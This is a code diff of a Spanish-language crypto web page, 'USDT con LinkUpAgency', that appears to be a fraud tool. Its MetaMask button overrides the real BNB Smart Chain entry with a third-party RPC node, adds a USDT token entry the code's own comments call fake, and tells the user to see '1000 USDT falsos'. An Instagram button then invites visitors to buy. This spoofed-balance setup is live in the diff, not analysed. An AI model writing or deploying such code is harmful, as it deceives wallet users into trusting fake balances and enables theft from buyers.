@@ -1,89 +1,101 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT 💸 con LinkUpAgency</title>
-  <style>
-    body {
-      background-color: #0f172a;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 40px 20px;
-    }
-    h1 {
-      font-size: 2em;
-      margin-bottom: 40px;
-    }
-    button {
-      background-color: #22c55e;
-      color: white;
-      border: none;
-      padding: 14px 28px;
-      font-size: 16px;
-      border-radius: 8px;
-      cursor: pointer;
-      margin: 10px;
-    }
-    button:hover {
-      background-color: #16a34a;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>USDT 💸 con LinkUpAgency</title>
+<style>
+  body {
+    background: #0f172a;
+    color: white;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    text-align: center;
+    padding: 50px 20px;
+  }
+  h1 {
+    margin-bottom: 40px;
+  }
+  button {
+    background-color: #22c55e;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    padding: 15px 30px;
+    font-size: 18px;
+    cursor: pointer;
+    margin: 12px;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #16a34a;
+  }
+</style>
 </head>
 <body>
-  <h1>USDT 💸 con LinkUpAgency</h1>
 
-  <button onclick="connect()">Connect MetaMask</button><br/>
-  <button onclick="window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank')">Contactar o Comprar con LinkUp 🔗</button>
+<h1>USDT 💸 con LinkUpAgency</h1>
 
-  <script>
-    async function connect() {
-      if (!window.ethereum) {
-        alert("Por favor instala MetaMask.");
-        return;
-      }
+<button id="connectBtn">Connect MetaMask</button><br/>
+<button id="instagramBtn">Contactar o Comprar con LinkUp 🔗</button>
 
-      try {
-        // Conectar cuenta
-        await ethereum.request({ method: 'eth_requestAccounts' });
+<script>
+  // Función para abrir Instagram
+  document.getElementById('instagramBtn').onclick = function() {
+    window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank');
+  };
 
-        // Agregar red BNB Smart Chain de Catflash
-        await ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: '0x38',
-            chainName: 'BNB Smart Chain Mainnet',
-            rpcUrls: ['https://dataseed-binance.catflash.cat/'],
-            nativeCurrency: {
-              name: 'BNB',
-              symbol: 'BNB',
-              decimals: 18
-            },
-            blockExplorerUrls: ['https://bscscan.com']
-          }]
-        });
+  const connectBtn = document.getElementById('connectBtn');
 
-        // Agregar token USDT falso
-        await ethereum.request({
-          method: 'wallet_watchAsset',
-          params: {
-            type: 'ERC20',
-            options: {
-              address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-              symbol: 'USDT',
-              decimals: 6,
-              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png?v=032'
-            }
-          }
-        });
-
-        alert("✅ Conectado, red y token añadidos. Abre MetaMask para ver los 1000 USDT.");
-      } catch (err) {
-        console.error(err);
-        alert("❌ Error al conectar MetaMask o añadir red/token.");
-      }
+  async function connect() {
+    if (!window.ethereum) {
+      alert("Por favor instala MetaMask.");
+      return;
     }
-  </script>
+
+    try {
+      // Solicita acceso a las cuentas
+      await ethereum.request({ method: 'eth_requestAccounts' });
+
+      // Añade la red BNB Smart Chain personalizada de Catflash
+      await ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [{
+          chainId: '0x38',
+          chainName: 'BNB Smart Chain Mainnet',
+          rpcUrls: ['https://dataseed-binance.catflash.cat/'],
+          nativeCurrency: {
+            name: 'BNB',
+            symbol: 'BNB',
+            decimals: 18
+          },
+          blockExplorerUrls: ['https://bscscan.com']
+        }]
+      });
+
+      // Añade el token USDT falso de Catflash
+      await ethereum.request({
+        method: 'wallet_watchAsset',
+        params: {
+          type: 'ERC20',
+          options: {
+            address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+            symbol: 'USDT',
+            decimals: 6,
+            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png?v=032'
+          }
+        }
+      });
+
+      alert("✅ ¡Conectado! Abre MetaMask y deberías ver tus 1000 USDT falsos.");
+
+    } catch (error) {
+      console.error(error);
+      alert("❌ Error al conectar MetaMask o añadir red/token. Mira la consola para más detalles.");
+    }
+  }
+
+  connectBtn.onclick = connect;
+</script>
+
 </body>
 </html>
